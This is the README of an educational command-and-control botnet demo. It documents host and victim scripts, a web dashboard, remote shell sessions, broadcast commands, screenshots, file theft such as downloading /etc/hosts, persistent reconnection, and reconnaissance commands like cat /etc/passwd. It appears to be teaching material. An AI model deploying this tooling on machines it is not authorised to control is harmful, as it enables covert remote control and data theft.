# Layer Zero Botnet

---

## Disclaimer

The code in this repository is intended for **EDUCATIONAL purposes ONLY**.
Please use this repository and information learned from it responsibly.
Layer Zero and the University of Nevada, Las Vegas are not responsible for irresponsible activity conducted using this code.

---

## Overview

A command-and-control (C2) botnet demonstration with two interfaces:

| Component         | File                    | Description                                         |
|-------------------|-------------------------|-----------------------------------------------------|
| **Host**          | `botnet/host.py`        | Command center — manages victims via terminal CLI   |
| **Victim**        | `botnet/victim.py`      | Client — connects to host and executes commands     |
| **Web Dashboard** | `botnet/dashboard.html` | Browser-based GUI served at `http://localhost:8080` |

### Features

- **TLS/SSL encryption** — auto-generated self-signed certificates
- **Authentication** — challenge-response auth with shared secret key
- **Web dashboard** — full browser GUI with live activity feed
- **Heartbeat monitoring** — automatic dead connection detection
- **Scheduled commands** — queue commands to run at specific times
- **System info gathering** — hostname, OS, user, architecture, etc.
- **Screenshot capture** — remote screen capture (if PIL available)
- **File transfer** — upload/download files to/from victims
- **Auto-reconnect** — victim can persist through disconnections
- **Activity logging** — debug logs + live activity feed
- **Multi-victim management** — control many sessions simultaneously

---

## Quick Start

### Prerequisites

- Python 3.8+
- Flask — install once with `pip install flask` (or `conda install flask`)

### 1. Install Flask

```bash
pip install flask
```

### 2. Start the Host

From the **repository root**:

```bash
./run_host.sh

# Alternively, you can run the host directly with Python:
python3 botnet/host.py
```

The script automatically finds whichever Python on your machine has Flask installed.

You should see:

```
 ____ ____ ____ ____ ____ _________ ____ ____ ____ ____
||L |||A |||Y |||E |||R |||       |||Z |||E |||R |||O ||
||__|||__|||__|||__|||__|||_______|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/_______\|/__\|/__\|/__\|/__\|

[+] TLS encryption enabled
[+] Listening on 0.0.0.0:4444
[+] Web dashboard: http://localhost:8080
[+] Type 'help' for available commands
*Center:
```

### 3. Start a Victim

Open a **second terminal** and run:

```bash
./run_victim.sh

# Alternatively, run the victim directly with Python:
python3 botnet/victim.py
```

The host terminal will show:

```
[+] Victim connected: 127.0.0.1:XXXXX (victim-0)
```

### 4. Usage

You now have **two ways** to interact:

- **Terminal** — type commands at the `*Center:` prompt (see below)
- **Browser** — open **http://localhost:8080** for the web dashboard

---

## Host CLI Options

```bash
python3 host.py [OPTIONS]
```

| Flag              | Default | Description                                             |
|-------------------|---------|---------------------------------------------------------|
| `--port PORT`     | `4444`  | Port to listen on                                       |
| `--web-port PORT` | `8080`  | Web dashboard port                                      |
| `--no-web`        | off     | Disable the web dashboard entirely                      |
| `--auth-key KEY`  | none    | Require victims to authenticate with this shared secret |
| `--debug`         | off     | Enable verbose logging to `logs/host.log`               |

**Examples:**

```bash
# Basic (no auth, default ports)
python3 host.py

# With authentication
python3 host.py --auth-key mysecretkey

# Custom ports, debug mode
python3 host.py --port 5555 --web-port 9090 --debug

# Terminal only (no web dashboard)
python3 host.py --no-web
```

## Victim CLI Options

```bash
python3 victim.py [OPTIONS]
```

| Flag              | Default.    | Description                        |
|-------------------|-------------|------------------------------------|
| `--host IP`       | `127.0.0.1` | Host IP to connect to              |
| `--port PORT`     | `4444`      | Host port to connect to            |
| `--auth-key KEY`  | none        | Shared secret (must match host)    |
| `--persistent`    | off         | Auto-reconnect if connection drops |
| `--reconnect SEC` | `5`         | Seconds between reconnect attempts |

**Examples:**

```bash
# Basic (localhost, default port)
python3 victim.py

# Connect to remote host with auth
python3 victim.py --host 192.168.1.100 --auth-key mysecretkey

# Persistent connection (auto-reconnect)
python3 victim.py --persistent --reconnect 10
```

---

## Using the Terminal (CLI)

### Command Center (`*Center:` prompt)

| Command                      | Description                     | Example                   |
|------------------------------|---------------------------------|---------------------------|
| `help`                       | Show help menu                  | `help`                    |
| `targets`                    | List all victims with status    | `targets`                 |
| `session <#>`                | Enter a victim's shell          | `session 0`               |
| `name <#> <name>`            | Rename a session                | `name 0 WebServer`        |
| `sendall <cmd>`              | Send command to ALL victims     | `sendall whoami`          |
| `schedule <#> <HH:MM> <cmd>` | Schedule a command              | `schedule 0 14:30 whoami` |
| `schedules`                  | List pending scheduled tasks    | `schedules`               |
| `clear`                      | Remove disconnected sessions    | `clear`                   |
| `debug`                      | Toggle debug logging on/off     | `debug`                   |
| `quit`                       | Disconnect all victims and exit | `quit`                    |

### Victim Shell (`Shell#:` prompt)

After entering a session with `session <#>`:

| Command           | Description                                  | Example                      |
|-------------------|----------------------------------------------|------------------------------|
| `<any command>`   | Run a system command                         | `ls -la`, `whoami`, `ps aux` |
| `cd [path]`       | Change directory (no path = home)            | `cd /tmp` or just `cd`       |
| `download <file>` | Download file from victim                    | `download /etc/hosts`        |
| `upload <file>`   | Upload file to victim                        | `upload payload.txt`         |
| `sysinfo`         | Get full system information                  | `sysinfo`                    |
| `screenshot`      | Capture victim's screen                      | `screenshot`                 |
| `help`            | Show shell help menu                         | `help`                       |
| `back`            | Return to Command Center (keep victim alive) | `back`                       |
| `exit`            | Disconnect the victim permanently            | `exit`                       |

### Example Terminal Session

```bash
# Start host
./run_host.sh --auth-key demo123

# (In another terminal) Start victim
./run_victim.sh --auth-key demo123 --persistent

# Back in the host terminal:
*Center: targets
  #    Name                 IP                     Status         Last Activity
  -------------------------------------------------------------------------------
  0    victim-0             127.0.0.1:54088        connected      2026-02-28T12:00:00

*Center: name 0 TestVM
[+] Session 0 renamed to "TestVM"

*Center: session 0
[+] Connected to Session "TestVM" at 127.0.0.1:54088

Shell#127.0.0.1: whoami
johnPC

Shell#127.0.0.1: sysinfo
  ── System Information ──
  hostname         my-macbook
  username         johnPC
  os               Darwin 23.1.0
  architecture     arm64
  python           3.11.5
  cwd              /Users/johnPC
  pid              12345
  home             /Users/johnPC

Shell#127.0.0.1: ls -la
total 8
drwxr-xr-x   5 johnPC  staff   160 Feb 28 12:00 .
...

Shell#127.0.0.1: download /etc/hosts
[+] Downloaded: downloads/hosts

Shell#127.0.0.1: back
[+] Returning to Command Center...

*Center: sendall uptime
[+] Sending to 1 victim(s)...
--- TestVM ---
12:00  up 3 days, 2:30, 2 users

*Center: schedule 0 15:00 df -h
[+] Scheduled "df -h" on Session 0 at 2026-02-28 15:00

*Center: quit
[+] Exiting Command Center...
```

---

## Using the Web Dashboard (Browser)

When the host is running, open **http://localhost:8080** in your browser.

### Layout

| Section            | Location      | Description                                             |
|--------------------|---------------|---------------------------------------------------------|
| **Quick Commands** | Left sidebar  | Click-to-use example commands organized by category     |
| **Stats Bar**      | Top center    | Live counts — total, connected, disconnected, scheduled |
| **Victims Table**  | Center        | All sessions with status, IP, timestamps, actions       |
| **Command Input**  | Center        | Target selector + command field + execute button        |
| **Output Console** | Center bottom | Timestamped, color-coded output log                     |
| **Activity Feed**  | Right panel   | Live feed of all events (connects, commands, etc.)      |
| **Schedules**      | Right panel   | Create and view scheduled tasks                         |

### Quick Command Categories (Sidebar)

The sidebar provides **click-to-fill** example commands you can try:

| Category           | Commands                                                 |
|--------------------|----------------------------------------------------------|
| **Reconnaissance** | `whoami`, `hostname`, `pwd`, `id`, `uname -a`, `sysinfo` |
| **File System**    | `ls -la`, `cat /etc/passwd`, `df -h`, `find *.log`       |
| **Network**        | `ifconfig`, `netstat`, `curl ifconfig.me`, `arp -a`      |
| **System**         | `ps aux`, `env`, `uptime`, OS version, `screenshot`      |
| **Navigation**     | `cd /`, `cd` (home), `cd ..`                             |

### How to Use the Dashboard

1. **Select a target** — use the dropdown to pick "All Victims" or a specific session
2. **Enter a command** — type it manually or click a command from the sidebar
3. **Click Execute** (or press Enter) — results appear in the output console
4. **View activity** — the right panel shows a live feed of all actions
5. **Get system info** — click the 📊 button on any victim row
6. **Rename sessions** — click the ✏️ button on any victim row
7. **Schedule commands** — switch to the ⏰ Schedules tab in the right panel
8. **Clear dead sessions** — click "🧹 Clear Dead" in the header

### Keyboard Shortcuts

| Shortcut         | Action                  |
|------------------|-------------------------|
| `Ctrl+K` / `⌘+K` | Focus the command input |
| `Enter`          | Execute the command     |
| `Escape`         | Close any open modal    |

---

## Testing Multiple Victims

Open several terminals and start victims in each:

```bash
# Terminal 2
./run_victim.sh

# Terminal 3
./run_victim.sh

# Terminal 4
./run_victim.sh
```

Then use `targets` in the host or check the web dashboard — you'll see all connected sessions. Use `sendall <cmd>` to execute a command on every victim at once.

---

## Network Configuration

### Same Device (Testing)

No configuration needed — victim defaults to `127.0.0.1:4444`.

### Different Devices (Real Network)

1. Find your host machine's IP:
   ```bash
   ifconfig    # macOS/Linux
   ipconfig    # Windows
   ```

2. Start the host:
   ```bash
   ./run_host.sh --auth-key yoursecret
   ```

3. On the victim machine, point to the host's IP:
   ```bash
   ./run_victim.sh --host 192.168.1.100 --auth-key yoursecret
   ```

4. Ensure port **4444** (C2) and **8080** (web dashboard) are open in your firewall.

---

## Project Structure

```
botnet/
├── README.md               # This file
├── LICENSE                  # License
└── botnet/
    ├── host.py             # Command center (server)
    ├── victim.py           # Victim client
    ├── dashboard.html      # Web dashboard frontend
    ├── certs/              # Auto-generated TLS certificates (gitignored)
    ├── downloads/          # Files downloaded from victims (gitignored)
    └── logs/               # Debug logs when --debug is used (gitignored)
```

---

## Troubleshooting

| Problem                            | Solution                                                                         |
|------------------------------------|----------------------------------------------------------------------------------|
| `Flask not found in any Python`    | Run `pip install flask` or `conda install flask`, then retry `./run_host.sh`     |
| `Connection refused`               | Make sure host.py is running **before** starting victim.py                       |
| `Authentication failed`            | Ensure `--auth-key` matches on both host and victim                              |
| `./run_host.sh: Permission denied` | Run `chmod +x run_host.sh run_victim.sh`                                         |
| `Port already in use`              | Use `--port` and/or `--web-port` to pick different ports                         |
| `TLS cert generation failed`       | Install OpenSSL: `brew install openssl` (macOS) or `apt install openssl` (Linux) |
| `Web dashboard not loading`        | Check that `--no-web` is not set; verify port 8080 is free                       |
| `Screenshot not available`         | Install Pillow: `pip install Pillow` (optional)                                  |
| `Victim won't reconnect`           | Use the `--persistent` flag on victim.py                                         |

---

## License

See [LICENSE](LICENSE) file for details.

---

## Credits

Created by **Layer Zero** @ University of Nevada, Las Vegas